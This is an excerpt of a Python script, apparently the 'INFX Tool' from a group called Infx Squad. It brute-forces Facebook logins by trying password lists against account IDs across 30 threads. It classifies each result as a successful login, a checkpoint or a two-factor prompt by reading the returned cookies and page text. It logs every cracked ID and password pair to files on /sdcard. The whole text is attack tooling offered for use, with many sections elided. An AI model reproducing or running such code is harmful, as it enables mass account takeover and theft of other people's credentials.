...
logo ="""     \033[1;37m____ \033[1;32m                           \033[1;37m____   
    \033[1;37m(  __)\033[1;32m  ____  ____   _____  __ __  \033[1;37m      (__  )  
    \033[1;37m| (\033[1;32m    |    ||    \ |     ||  |  |/\033[1;37m         ) | 
    \033[1;37m| |\033[1;32m     |  | |  _  ||   __||  |  |\033[1;37m          | |  
    \033[1;37m| |\033[1;32m     |  | |  |  ||  |_  |_   _|\033[1;37m          | |  
    \033[1;37m| |\033[1;32m     |  | |  |  ||   _] |     |\033[1;37m          | |  
    \033[1;37m| (__\033[1;32m   |  | |  |  ||  |   |  |  |\033[1;37m        __) |  
    \033[1;37m(____)\033[1;32m |____||__|__||__|   |__|__|\033[1;37m        (____)
\033[1;37m╔\033[1;36mⒽⒷⒻ\033[1;37m═══════════════════\033[1;36m𝐇𝐁𝐅✯𝐓𝐄𝐀𝐌\033[1;37m═════════════════\033[1;36mⒽⒷⒻ\033[1;37m╗
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟   \033[1;32mSamir B. Thakuri          \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟   \033[1;32mSamir B. Thakuri          \033[1;31m│
\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟  \033[1;32m notsopreety                  \033[1;31m │
\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟   \033[1;32mNot Made                  \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟   \033[1;32m0.1                          \033[1;31m   │
\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32mInfx Squad Official\033[1;37m {\033[1;36mHBF\033[1;37m} \033[1;31m│
...
def main():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════════')
    print("           \x1b[97m[\033[37;41m  WELCOME. TO INFX TOOL \033[0;m] ")
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                ...
                print('\r\033[1;32m[INFX-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                ...
                if 'Enter login code to continue' in str(d):
                    ...
                    print('\r\033[1;35m[INFX-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('/sdcard/HAMII_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio HAMII_CP.mp3")
                    print('\r\033[1;31m[INFX-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
...
def method2(ids,names,passlist,total_ids):
    ...
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}[INFX 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio HAMII_OK.mp3")
                print('\r\033[1;32m[INFX-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('/sdcard/HAMII_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                ...
                if 'Enter login code to continue' in str(d.group(1)):
                    os.system("play-audio HAMII_2F.mp3")
                    print('\r\033[1;35m[INFX-2F] '+ids+' | '+pas+'\033[0;97m')
                    tf.append(ids)
                    open('/sdcard/HAMII_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio HAMII_CP.mp3")
                    print('\r\033[1;31m[INFX-CP] '+ids+' | '+pas+'\033[0;97m')
                    cp.append(ids)
                    open('/sdcard/HAMII_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
...
def random_method(ids,passlist,total_ids):
    ...
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r{WHITE}[INFX 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        for pas in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if cid in ok:
                    ...
                    os.system("play-audio HAMII_OK.mp3")
                    print('\r\033[1;92m[INFX-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                ...
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        os.system("play-audio HAMII_2F.mp3")
                        print('\r\033[1;95m[INFX-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        ...
                        if cid in cp:
                            ...
                            os.system("play-audio HAMII_CP.mp3")
                            print('\r\033[1;94m[INFX-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
...
def pass1():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
        print(f" {WHITE}Infx Squad Always On Top ")
        print(f'{RED}======================================================')
        for love in user:
            uid = code+love
            pwx = [love,]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[INFX_SQUAD 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
